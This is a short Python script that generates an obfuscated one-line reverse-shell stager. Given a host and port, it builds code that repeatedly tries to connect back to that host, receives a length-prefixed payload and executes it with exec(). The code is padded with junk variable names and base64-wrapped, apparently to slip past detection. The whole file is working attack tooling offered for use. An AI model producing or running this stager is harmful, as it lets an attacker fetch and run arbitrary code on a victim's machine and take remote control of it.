import sys
import base64
host = str(sys.argv[1])
port = sys.argv[2]

payload = """import base64
import hashlib
import socket
import struct
import time
line1 = "this"
line1 = "is"
line1 = "simply"
line1 = "made"
line1 = "up"
aVariableWhichIDontKnowWhyExistsLOL=0
while(aVariableWhichIDontKnowWhyExistsLOL<10):
	try:
		HopeSocketWorksWithoutVariableS=socket.socket(2,socket.SOCK_STREAM)
		HopeSocketWorksWithoutVariableS.connect(('"""+host+"""',"""+port+"""))
		break
	except:
		time.sleep(5)
	aVariableWhichIDontKnowWhyExistsLOL=aVariableWhichIDontKnowWhyExistsLOL+1
l=struct.unpack('>I',HopeSocketWorksWithoutVariableS.recv(4))[0]
d=HopeSocketWorksWithoutVariableS.recv(l)
while len(d)<l:
	d+=HopeSocketWorksWithoutVariableS.recv(l-len(d))
exec(d,{'HopeSocketWorksWithoutVariableS':HopeSocketWorksWithoutVariableS})"""
payload = base64.b64encode(payload.encode('utf-8'))

payload2 = "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,\'UTF-8\')}[sys.version_info[0]](\'"+str(payload.decode('utf-8'))+"')))"

print(payload2)
